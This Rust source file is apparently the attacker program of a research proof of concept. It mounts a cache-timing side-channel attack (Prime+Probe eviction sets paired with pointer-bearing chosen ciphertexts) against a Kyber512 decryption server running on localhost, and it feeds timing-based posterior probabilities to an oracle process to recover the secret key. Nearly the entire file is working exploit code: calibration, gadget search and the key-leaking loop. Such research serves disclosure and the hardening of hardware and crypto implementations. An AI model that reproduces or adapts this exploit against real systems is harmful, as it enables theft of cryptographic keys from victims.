use crypto_attacker::*;
use libaugury_ffi_sys::{c_sleep, pin_cpu, flush_evset};
use libkyber_ffi_sys::{pqcrystals_kyber512_ref_enc_attack, pqcrystals_kyber512_ref_enc_fake, 
    KYBER_SYMBYTES, CRYPTO_PUBLICKEYBYTES, CRYPTO_BYTES, 
    CRYPTO_CIPHERTEXTBYTES, KYBER_N, KYBER_K, pqcrystals_kyber512_ref_indcpa_get_pk_coef};
// std lib
use std::os::raw::{c_int, c_uchar};
use std::env::args;
use std::mem::size_of;
use std::sync::atomic::Ordering;
use std::sync::atomic::compiler_fence;
use std::net::{TcpStream};
use std::io::{Read, Write};
use std::sync::mpsc::{self, TryRecvError};
use std::thread;
use std::time::Instant;
use std::f64::consts::PI;
// file lib
use std::fs::{File, read_to_string};
// random value lib
use rand::{Rng, thread_rng};
// mmap lib
use mmap_rs::MmapOptions;
// P+P lib
use evict_rs::timer::Timer;
use evict_rs::MyTimer;
use evict_rs::{eviction_set_gen64,
    prime_with_dependencies, probe_with_dependencies, 
    evset_vec_to_evset, evset_vec_set_offset};
use evict_rs::allocator::Allocator;
use evict_rs::eviction_set::EvictionSet;

const NUM_POINTERS: usize = KYBER_SYMBYTES as usize / 8;  // pointer has 8 bytes

// Generate ptr masked value (random secret)
fn get_rnd_ct(ptr: *mut u64, rand_mask: u64, rng: &mut impl Rng) {
    for i in 0..NUM_POINTERS {
        unsafe{ *ptr.add(i) = rng.gen::<u64>() ^ rand_mask; }
    }
}

// Generate ptr masked value (ptr secret)
fn get_ptr_ct(ptr: *mut u64, target_ptr: u64, pos: usize, rand_mask: u64, rng: &mut impl Rng) {
    for i in 0..NUM_POINTERS {
        if i == pos {
            unsafe{ *ptr.add(i) = target_ptr ^ rand_mask; }
        } else {
            unsafe{ *ptr.add(i) = target_ptr ^ (rng.gen::<u64>() & 0xffff00) ^ rand_mask; }
        }
    }
}

// Hard-coded values!
const MU_0:    f64 = 677.412;
const SIGMA_0: f64 = 287.402;
const MU_1:    f64 = 858.235;
const SIGMA_1: f64 = 242.153;

const T_MIN: u64 = 1;
const T_MAX: u64 = 1500;

#[inline(always)]
fn log_pdf(t: f64, mu: f64, sigma: f64) -> f64 {
    let diff   = t - mu;
    let s2     = sigma * sigma;
    -0.5 * diff * diff / s2 - 0.5 * (2.0 * PI).ln() - sigma.ln()
}

/// numerically stable log-sum-exp for two values
#[inline(always)]
fn log_sum_exp(a: f64, b: f64) -> f64 {
    if a > b {
        a + (b - a).exp().ln_1p()
    } else {
        b + (a - b).exp().ln_1p()
    }
}

/// posterior P(class = 0 | measurements) with uniform prior
fn posterior_p0(times: &[u64]) -> (f64, usize) {
    let mut log_lik_0 = 0.0;
    let mut log_lik_1 = 0.0;
    let mut skipped = 0usize;

    for &t in times {
        if !(T_MIN..=T_MAX).contains(&t) {
            skipped += 1;
            continue;
        }
        let t = t as f64;
        log_lik_0 += log_pdf(t, MU_0, SIGMA_0);
        log_lik_1 += log_pdf(t, MU_1, SIGMA_1);
    }

    // posterior with equal priors
    let log_den   = log_sum_exp(log_lik_0, log_lik_1);
    ((log_lik_0 - log_den).exp(), skipped)
}

fn kyber_hacker(
    mut stream: TcpStream,
    mut oracle_stream: TcpStream,
    victim_array_cache_lines: &mut Vec<*mut u8>,
    repetitions: usize,
    pp_threshold: u64,
    num_group: usize,
    flush_ptr: *mut u64,
    victim_cl_start: u64,
    victim_cl_end: u64,
    victim_buf_offset: u64,
    poll_times: usize,
    timer: &MyTimer,
    mut bench_time_file: &File
) {
    let mut __trash: u64 = 0;
    let mut test_time: u64;
    let mut rng = thread_rng();
    let mut msg_data = [0u8; 1];
    // prepare masked pointer value
    let rand_mask: u64 = rng.gen::<u64>() & (MSB_MASK - 1);

    // Kyber
    let mut ss: [c_uchar; CRYPTO_BYTES as usize] = [0; CRYPTO_BYTES as usize];
    let mut pk: [c_uchar; CRYPTO_PUBLICKEYBYTES as usize] = [0; CRYPTO_PUBLICKEYBYTES as usize];
    let mut ct: [c_uchar; CRYPTO_CIPHERTEXTBYTES as usize] = [0; CRYPTO_CIPHERTEXTBYTES as usize];
    let mut ct_tmp: [c_uchar; CRYPTO_CIPHERTEXTBYTES as usize] = [0; CRYPTO_CIPHERTEXTBYTES as usize];
    let mut ct_rand: [c_uchar; CRYPTO_CIPHERTEXTBYTES as usize] = [0; CRYPTO_CIPHERTEXTBYTES as usize];
    let mut ptr: [u64; NUM_POINTERS as usize] = [0; NUM_POINTERS as usize];

    // --------------------------------Calibration-----------------------------
    println!("--------------------------------Calibration-----------------------------");
    // Try different combination of ptr sequence / flush thread / guess number / p+p to window 0
    let mut target_addr: u64 = 0;
    let flush_ptr_value: u64 = flush_ptr as u64;
    let mut global_pp_idx: usize = 0;
    let mut global_flush_group_idx = 0;
    let mut result_file = File::create("kyber.txt").unwrap();
    let mut ct_received = File::create("ct_received.txt").unwrap();
    // let mut stats_file = File::create("kyber_accuracy.txt").unwrap();
    let mut pp_idx = 0;
    let mut pointer_idx = 0;
    let mut group_search_flag = 0;
    let mut threshold_v: Vec<u64> = vec![];
    let mut threshold_leak: u64;
    let mut profile_base_vec = vec![]; // store profile result for base
    let mut profile_atk_vec = vec![];  // store profile result for atk

    // Contention detection
    // prepare random chosen cipher
    get_rnd_ct(ptr.as_mut_ptr() as *mut u64, rand_mask, &mut rng);
    let mut non_conflict_set = vec![];
    let mut target_ptr_offset: u64;
    let mut offest_trials: u64 = 0;
    evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, victim_buf_offset as usize, 
        0, NUM_EVSETS/num_group, flush_ptr);
    // create flush thread
    let (tx, rx) = mpsc::channel();
    let _handle = thread::spawn(move || {
        unsafe{ pin_cpu(5); }
        loop {
            unsafe{ flush_evset(flush_ptr_value as *mut u64, (NUM_EVSETS / num_group * L2_CACHE_WAYS) as u32); }

            match rx.try_recv() {
                Ok(_) | Err(TryRecvError::Disconnected) => {
                    match rx.recv() {
                        Ok(_) => {},
                        Err(_) => {break;}
                    }
                },
                Err(TryRecvError::Empty) => {}
            };
        };
    });
    // Stop flush thread
    __trash = match tx.send(__trash) {
        Ok(_) => {unsafe{ c_sleep(0, __trash) }},
        Err(_) => {panic!("Send Error");}
    };
    println!("[+] Flush thread is created!");
    let cevset_now = Instant::now();
    loop {
        target_ptr_offset = rng.gen::<u64>() & 0x3f80 & (!(0x1 << 7));
        if target_ptr_offset == victim_buf_offset {
            println!("The same as victim array offset!");
            continue;
        }
        println!("[+] Set Target Pointer Offset as {:#x}", target_ptr_offset);
        // divide evset group into conflict and non-conflict
        let mut conflict_times: u64 = 0;
        let mut conflict_set = vec![];
        for i in 0..NUM_EVSETS {
            // one iteration
            // fetch prime+probe evset
            let mut result_evset: Vec<*mut u8> = Vec::new();
            evset_vec_to_evset(&victim_array_cache_lines, 
                &mut result_evset, L2_CACHE_WAYS, target_ptr_offset as usize, i);
            let evset_victim_buf = EvictionSet::new(&mut result_evset);

            let mut times_to_load_test_ptr_atk = vec![];

            // test one prime+probe evset
            for _ in 0..repetitions {
                // send request
                msg_data[0] = !(__trash & MSB_MASK) as u8;
                stream.write_all(&msg_data).unwrap();

                // receive pubkey from victim
                stream.read_exact(&mut pk).unwrap();

                // Chosen-Cipher for no flip
                unsafe {
                    match pqcrystals_kyber512_ref_enc_attack(ct_rand.as_mut_ptr() as *mut c_uchar, 
                    ss.as_mut_ptr() as *mut c_uchar, pk.as_ptr() as *const c_uchar, ptr.as_mut_ptr() as *mut u64, 
                    0, 0, rand_mask) {
                        0 => (),
                        _ => panic!("Fail to generate Chosen-Cipher!")
                    };
                }

                // Resume flush thread
                __trash = match tx.send(__trash) {
                    Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                    Err(_) => {panic!("Send Error");}
                };
    
                compiler_fence(Ordering::SeqCst);

                __trash += ct_rand[0] as u64;

                compiler_fence(Ordering::SeqCst);
                __trash = unsafe{c_sleep(1500000, __trash)};

                compiler_fence(Ordering::SeqCst);
                __trash = prime_with_dependencies(&evset_victim_buf, __trash);
                ct_rand[0] = ct_rand[0] | (__trash & MSB_MASK) as u8;
                // send cipher text
                stream.write_all(&ct_rand).unwrap();

                // receive finish signal
                stream.read_exact(&mut msg_data).unwrap();
                __trash += msg_data[0] as u64;
                // Stop flush thread
                __trash = match tx.send(__trash) {
                    Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                    Err(_) => {panic!("Send Error");}
                };
                compiler_fence(Ordering::SeqCst);

                // measure microarchitectural state
                test_time = probe_with_dependencies(timer, &evset_victim_buf, __trash);
                times_to_load_test_ptr_atk.push(test_time);
            }
            times_to_load_test_ptr_atk.sort();
            let median_test = times_to_load_test_ptr_atk[(times_to_load_test_ptr_atk.len() / 2 - 1) as usize];
            if median_test >= pp_threshold {
                conflict_times += 1;
                conflict_set.push(i);
                println!("Conflict times/Non-conflict times: {}/{} -> {}", conflict_times, i+1, median_test);
            } else {
                non_conflict_set.push(i);
                println!("Conflict times/Non-conflict times: {}/{} -> {}", conflict_times, i+1, median_test);
            }
        }
        println!("[+] Conflict set: {}; Non-conflict set: {}", conflict_set.len(), non_conflict_set.len());

        if non_conflict_set.len() <= 5 {
            println!("Number of Non-conflict set is not enough, try different page offset for target pointer");
            non_conflict_set.clear();
            offest_trials += 1;
            if offest_trials >= 3 {
                msg_data[0] = (__trash & MSB_MASK) as u8;
                stream.write_all(&msg_data).unwrap();
                panic!("3 times bad conflict tests!");
            }
        } else {
            break;
        }
    }

    // Store the pk coefficients
    let mut coeffs_vec_t: [i16; (KYBER_K*KYBER_N) as usize] = [0; (KYBER_K*KYBER_N) as usize];
    let mut coeffs_vec_a: [i16; (KYBER_K*KYBER_K*KYBER_N) as usize] = [0; (KYBER_K*KYBER_K*KYBER_N) as usize];
    unsafe{ pqcrystals_kyber512_ref_indcpa_get_pk_coef(pk.as_ptr() as *const c_uchar, 
        coeffs_vec_a.as_mut_ptr() as *mut i16, coeffs_vec_t.as_mut_ptr() as *mut i16); }
    // Store the public key
    let pk_file_path: &str = "kyber_pub.txt";
    let mut pk_file: File = File::create(pk_file_path).unwrap();
    for i in 0..(KYBER_K*KYBER_K*KYBER_N) as usize{
        write!(pk_file, "{}\n", coeffs_vec_a[i]).unwrap();
    }
    for i in 0..(KYBER_K*KYBER_N) as usize{
        write!(pk_file, "{}\n", coeffs_vec_t[i]).unwrap();
    }

    // Try different gadget settings
    let mut gadget_flag = 0;
    while pp_idx < non_conflict_set.len() {
        // fix prime+probe channel
        let mut pp_evset_vec_cur: Vec<*mut u8> = Vec::new();
        evset_vec_to_evset(&victim_array_cache_lines, 
            &mut pp_evset_vec_cur, L2_CACHE_WAYS, target_ptr_offset as usize, non_conflict_set[pp_idx]);
        global_pp_idx = non_conflict_set[pp_idx];
        assert_eq!(pp_evset_vec_cur.len(), L2_CACHE_WAYS);
        let pp_evset = EvictionSet::new(&mut pp_evset_vec_cur);
        println!("[+] P+P Evset {} Fixed!", pp_idx);

        let mut pp_bad_flag = 0;

        // try different target addr
        let mut target_addr_page = victim_cl_start;
        let mut num_target_addr_tries = 0;
        while target_addr_page < victim_cl_end {
            target_addr = target_addr_page + target_ptr_offset;
            num_target_addr_tries += 1;
            println!("[+] Try {}: Pick Target addr:{:#x} for P+P set {}", num_target_addr_tries, target_addr, pp_idx);

            // generate chosen cipher (target ptr)
            get_ptr_ct(ptr.as_mut_ptr() as *mut u64, target_addr, pointer_idx, rand_mask, &mut rng);
            // Chosen-Cipher for no flip
            unsafe {
                match pqcrystals_kyber512_ref_enc_attack(ct.as_mut_ptr() as *mut c_uchar, 
                ss.as_mut_ptr() as *mut c_uchar, pk.as_ptr() as *const c_uchar, ptr.as_mut_ptr() as *mut u64, 
                8, 0, rand_mask) {
                    0 => (),
                    _ => panic!("Fail to generate Chosen-Cipher!")
                };
            }
            // Chosen-Cipher for flip
            unsafe {
                match pqcrystals_kyber512_ref_enc_attack(ct_tmp.as_mut_ptr() as *mut c_uchar, 
                ss.as_mut_ptr() as *mut c_uchar, pk.as_ptr() as *const c_uchar, ptr.as_mut_ptr() as *mut u64, 
                8, 1, rand_mask) {
                    0 => (),
                    _ => panic!("Fail to generate Chosen-Cipher!")
                };
            }

            let mut flush_group_idx = 0;
            let mut noise_times = 0;
            let mut succeed_times = 0;
            while flush_group_idx < num_group {
                let now = Instant::now();
                if group_search_flag == 0 {
                    evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, 
                        (victim_buf_offset as usize + pointer_idx * size_of::<u64>()) & 0x3f80,
                        flush_group_idx, NUM_EVSETS/num_group, flush_ptr);
                    global_flush_group_idx = flush_group_idx;
                    println!("[+] Group {}:", flush_group_idx);
                } else {
                    evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, 
                        (victim_buf_offset as usize + pointer_idx * size_of::<u64>()) & 0x3f80,
                        global_flush_group_idx, NUM_EVSETS/num_group, flush_ptr);
                    println!("[+] Group {}:", global_flush_group_idx);
                }

                // Initial vectors to store results
                let mut times_to_load_test_ptr_base = vec![];
                let mut times_to_load_test_ptr_atk = vec![];
                // Initial mode
                let mut mode: u8 = 0;

                for _ in 0..repetitions*2 {
                    // send request
                    msg_data[0] = !(__trash & MSB_MASK) as u8;
                    stream.write_all(&msg_data).unwrap();
        
                    // receive pubkey from victim
                    stream.read_exact(&mut pk).unwrap();
    
                    // Chose Chosen Ciphertext
                    let ct_ptr = match mode {
                        0 => &mut ct,
                        0xff => &mut ct_tmp,
                        _ => panic!("Unexpected mode during calibration!"),
                    };

                    // Resume flush thread
                    __trash = match tx.send(__trash) {
                        Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                        Err(_) => {panic!("Send Error");}
                    };
        
                    compiler_fence(Ordering::SeqCst);
                    __trash = unsafe{c_sleep(1500000, __trash)};
        
                    compiler_fence(Ordering::SeqCst);
                    __trash = prime_with_dependencies(&pp_evset, __trash);
                    ct_ptr[0] = ct_ptr[0] | (__trash & MSB_MASK) as u8;
        
                    // send cipher text
                    stream.write_all(ct_ptr).unwrap();
        
                    // receive finish signal
                    stream.read_exact(&mut msg_data).unwrap();
                    __trash += msg_data[0] as u64;

                    // Stop flush thread
                    __trash = match tx.send(__trash) {
                        Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                        Err(_) => {panic!("Send Error");}
                    };
                    compiler_fence(Ordering::SeqCst);
        
                    // measure microarchitectural state
                    test_time = probe_with_dependencies(timer, &pp_evset, __trash);
                    __trash = test_time | (__trash & MSB_MASK);
                    // store result
                    if mode==0 {
                        times_to_load_test_ptr_atk.push(test_time);
                    } else {
                        times_to_load_test_ptr_base.push(test_time);
                    }
            
                    mode = !(mode | (__trash & MSB_MASK) as u8);

                    // Dumpy iteration to clean
                    msg_data[0] = !(__trash & MSB_MASK) as u8;
                    stream.write_all(&msg_data).unwrap();
                    stream.read_exact(&mut pk).unwrap();
                    stream.write_all(&ct_rand).unwrap();
                    stream.read_exact(&mut msg_data).unwrap();
                }
                times_to_load_test_ptr_atk.sort();
                times_to_load_test_ptr_base.sort();
                let median_test_atk = times_to_load_test_ptr_atk[(times_to_load_test_ptr_atk.len() / 2 - 1) as usize];
                let median_test_base = times_to_load_test_ptr_base[(times_to_load_test_ptr_base.len() / 2 - 1) as usize];
                println!("Attack mode: {}", median_test_atk);
                println!("Base mode: {}", median_test_base);

                // only if atk mode activate DMP but base mode does not
                if (median_test_atk > pp_threshold) && (median_test_base < pp_threshold) && (median_test_atk as i32 - median_test_base as i32 > 50) {
                    succeed_times += 1;
                    noise_times = 0;
                    threshold_v.push((median_test_atk + median_test_base) / 2);
                    println!("[+] Get Signal ({})", succeed_times);
                    // add profiling
                    profile_base_vec.append(&mut times_to_load_test_ptr_base);
                    profile_atk_vec.append(&mut times_to_load_test_ptr_atk);
                    if succeed_times >= 3 {
                        gadget_flag = 1;
                        println!("[+] Get Attack Gadgets!");
                        break;
                    }
                } else if median_test_base >= pp_threshold {
                    threshold_v.clear();
                    profile_base_vec.clear();
                    profile_atk_vec.clear();
                    noise_times += 1;
                    succeed_times = 0;
                    println!("[+] Noise Test Environment {}", noise_times);
                    if noise_times >= 3 {
                        println!("[+] Try different P+P Evset!");
                        pp_bad_flag = 1;
                        break;
                    }
                } else if median_test_atk <= pp_threshold {
                    threshold_v.clear();
                    profile_base_vec.clear();
                    profile_atk_vec.clear();
                    succeed_times = 0;
                    noise_times = 0;
                    println!("[+] No signal"); 
                    if group_search_flag == 0 {
                        flush_group_idx += 1;
                    } else {
                        break;
                    }
                }
                let trans_dur = now.elapsed();
                println!("[+] Time Elapse: {}s, {}ns", trans_dur.as_secs(), 
                    trans_dur.subsec_nanos());
            }
            if (gadget_flag == 1) || (pp_bad_flag == 1) {
                break;
            }
            target_addr_page += NATIVE_PAGE_SIZE as u64;
        }
        if gadget_flag == 1 {
            break;
        }
        if target_addr_page >= victim_cl_end {
            group_search_flag = 0;
        }
        pp_idx += 1;
    }
    if gadget_flag == 0 {
        msg_data[0] = (__trash & MSB_MASK) as u8;
        stream.write_all(&msg_data).unwrap();
        panic!("Bad unconflict set!");
    }

    // write profile result
    let mut prof_atk_file = File::create("kyber_1.txt").unwrap();
    let mut prof_base_file = File::create("kyber_0.txt").unwrap();
    for profile_idx in 0..profile_atk_vec.len() {
        write!(prof_atk_file, "{}\n", profile_atk_vec[profile_idx]).unwrap();
        write!(prof_base_file, "{}\n", profile_base_vec[profile_idx]).unwrap();
    }
    println!("[+] Storing Profile Result!");

    let mut pp_evset_vec: Vec<*mut u8> = Vec::new();
    evset_vec_to_evset(&victim_array_cache_lines, 
        &mut pp_evset_vec, L2_CACHE_WAYS, target_ptr_offset as usize, global_pp_idx);
    let pp_evset = EvictionSet::new(&mut pp_evset_vec);
    write!(bench_time_file, "Compound Evset finding time: {} s\n", cevset_now.elapsed().as_secs()).unwrap();

    // --------------------------------Start Leaking-----------------------------
    println!("--------------------------------Start Leaking-----------------------------");
    threshold_leak = threshold_v.iter().sum::<u64>() / threshold_v.len() as u64;
    println!("[+] Leak Threshold: {}", threshold_leak);

    // instead of creating a ciphertext here, we rely on a smart process that will submit us
    // with them, we just need to measure the timing, i.e. we are implementing an oracle here
    let oracle_repetitions: usize = 10;
    let mut ct_idx: usize = 0;
    let mut total_calls: usize = 0;
    let mut total_skipped_calls: usize = 0;

    // Send random mask and masked pointer so that constructed ciphertext is decrypted into
    // message containing victim pointer
    oracle_stream.write_all(&rand_mask.to_le_bytes()).unwrap();
    oracle_stream.write_all(&ptr[0].to_le_bytes()).unwrap();

    group_search_flag = 1;

    evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, 
        (victim_buf_offset as usize) & 0x3f80, 
        global_flush_group_idx, NUM_EVSETS/num_group, flush_ptr);

    loop {
        oracle_stream.read_exact(&mut msg_data).unwrap();
        if msg_data[0] != 0 {
            break;
        }
        oracle_stream.read_exact(&mut ct).unwrap();
        write!(ct_received, "idx:{}\n", ct_idx).unwrap();
        for i in 0..CRYPTO_CIPHERTEXTBYTES as usize {
            write!(ct_received, "{:#x}, ", ct[i]).unwrap();
        }
        write!(ct_received, "\n").unwrap();
        ct_idx += 1;

        let mut times_to_load_test_ptr_atk = vec![];
        for _ in 0..oracle_repetitions {
            msg_data[0] = !(__trash & MSB_MASK) as u8;
            stream.write_all(&msg_data).unwrap();

            // receive pubkey from victim
            stream.read_exact(&mut pk).unwrap();

            // Resume flush thread
            __trash = match tx.send(__trash) {
                Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                Err(_) => {panic!("Send Error");}
            };

            __trash = unsafe{c_sleep(1500000, __trash)};

            compiler_fence(Ordering::SeqCst);

            __trash = prime_with_dependencies(&pp_evset, __trash);
            ct[0] = ct[0] | (__trash & MSB_MASK) as u8;

            // send cipher text
            stream.write_all(&ct).unwrap();

            // receive finish signal
            stream.read_exact(&mut msg_data).unwrap();

            __trash += msg_data[0] as u64;

            // Resume flush thread
            __trash = match tx.send(__trash) {
                Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                Err(_) => {panic!("Send Error");}
            };
            compiler_fence(Ordering::SeqCst);
            // measure microarchitectural state
            test_time = probe_with_dependencies(timer, &pp_evset, __trash);
            __trash = test_time | (__trash & MSB_MASK);

            // store result
            times_to_load_test_ptr_atk.push(test_time);

            // Dumpy iteration to clean
            msg_data[0] = !(__trash & MSB_MASK) as u8;
            stream.write_all(&msg_data).unwrap();
            stream.read_exact(&mut pk).unwrap();
            stream.write_all(&ct_rand).unwrap();
            stream.read_exact(&mut msg_data).unwrap();
        }
        total_calls += oracle_repetitions;

        let (p0, skipped) = posterior_p0(&times_to_load_test_ptr_atk);
        total_skipped_calls += skipped;
        oracle_stream.write_all(&p0.to_be_bytes()).unwrap();
    }
    println!("Key recovery took {} measurements, filtered out {} of them; total used = {}", total_calls, total_skipped_calls, total_calls - total_skipped_calls);
    threshold_v.clear();
    // disconnect the transaction
    msg_data[0] = (__trash & MSB_MASK) as u8;
    stream.write_all(&msg_data).unwrap();
}


fn main() {
    let repetitions = args().nth(1).expect("Enter <repetitions>");
    let pp_threshold = args().nth(2).expect("Enter <prime+probe channel threshold>");
    let num_group = args().nth(3).expect("Enter <number of flush thread group to try>");
    let poll_times = args().nth(4).expect("Enter <number of trials to do poll>");
    let repetitions = repetitions.parse::<usize>().unwrap();
    let pp_threshold = pp_threshold.parse::<u64>().unwrap();
    let num_group = num_group.parse::<usize>().unwrap();
    assert_eq!(NUM_EVSETS % num_group, 0);
    let poll_times = poll_times.parse::<usize>().unwrap();

    // load victim array page offset
    let victim_buf_offset_str: Vec<String> = read_to_string("kyber_addr.txt").unwrap().lines().map(String::from).collect();
    let victim_buf_offset = match u64::from_str_radix(&(victim_buf_offset_str[0][2..]), 16) {
        Ok(result) => result & 0x3fff,
        Err(error) => panic!("Fail to parse memory boundary {}", error)
    };

    // load prefetch target search range
    let dyld_space_str: Vec<String> = read_to_string("dyld_space.txt").unwrap().lines().map(String::from).collect();
    println!("[+] Grab dyld search space from file...");
    let victim_cl_start = match u64::from_str_radix(&(dyld_space_str[0][2..]), 16) {
        Ok(result) => result & 0xffffffffffffc000,
        Err(error) => panic!("Fail to parse memory boundary {}", error)
    };
    let victim_cl_end = match u64::from_str_radix(&(dyld_space_str[1][2..]), 16) {
        Ok(result) => result & 0xffffffffffffc000,
        Err(error) => panic!("Fail to parse memory boundary {}", error)
    };
    println!("[+] Victim Array page offset -> {:#x}", victim_buf_offset);
    assert!((victim_buf_offset as usize + KYBER_SYMBYTES as usize) < NATIVE_PAGE_SIZE);
    println!("[+] Target Pointer start frame -> {:#x}", victim_cl_start);
    println!("[+] Target Pointer end frame -> {:#x}", victim_cl_end);
    println!("[+] Number of trial for each coefficient -> {}", poll_times);

    let first_pointer_offset = (victim_buf_offset as usize) & 0x3f80;
    for pointer_idx in 1..4 {
        let offset = (victim_buf_offset as usize + pointer_idx * size_of::<u64>()) & 0x3f80;
        if first_pointer_offset != offset {
            panic!("Full rotation checks are not going to work with given victim_buf_offset");
        }
    }

    unsafe{ pin_cpu(4); }

    // Allocate Precise Flush buffer
    let size_of_flush_buf: usize = size_of::<u64>() * (NUM_EVSETS/num_group) * L2_CACHE_WAYS;
    // Allocate via mmap
    let mut flush_buf_addr = MmapOptions::new(size_of_flush_buf)
        .map_mut()
        .unwrap();
    assert_eq!(size_of_flush_buf, flush_buf_addr.len());

    let flush_bytes = unsafe {
        core::slice::from_raw_parts_mut(
            flush_buf_addr.as_mut_ptr() as *mut u8,
            flush_buf_addr.len(),
        )
    };
    flush_bytes.fill(0x00);

    let flush_ptr = flush_buf_addr.as_mut_ptr() as *mut u64;

    // prepare 64 eviction set groups
    let mut bench_time_file = File::create("kyber_bench.txt").unwrap();
    println!("--------------------------------Evsets Preparation-----------------------------");
    let gen64_now = Instant::now();
    let timer = MyTimer::new();
    let mut victim_array_cache_lines: Vec<*mut u8> = Vec::new();
    let mut allocator = Allocator::new(0, NATIVE_PAGE_SIZE);
    eviction_set_gen64(&mut allocator, &mut victim_array_cache_lines, &timer);
    write!(bench_time_file, "64 evset gen time: {} s\n", gen64_now.elapsed().as_secs()).unwrap();

    let mut oracle_stream = match TcpStream::connect("localhost:3334") {
        Ok(s)  => s,
        Err(e) => {
            println!("Failed to connect: {}", e);
            return;
        }
    };
    match TcpStream::connect("localhost:3333") {
        Ok(stream) => {
            println!("Successfully connected to server in port 3333");
            kyber_hacker(stream, oracle_stream, &mut victim_array_cache_lines, repetitions, 
                pp_threshold, num_group, flush_ptr, victim_cl_start, victim_cl_end, 
                victim_buf_offset, poll_times, &timer, &bench_time_file);

        },
        Err(e) => {
            println!("Failed to connect: {}", e);
        }
    }
    println!("Terminated.");
    write!(bench_time_file, "Online time: {} s\n", gen64_now.elapsed().as_secs()).unwrap();
}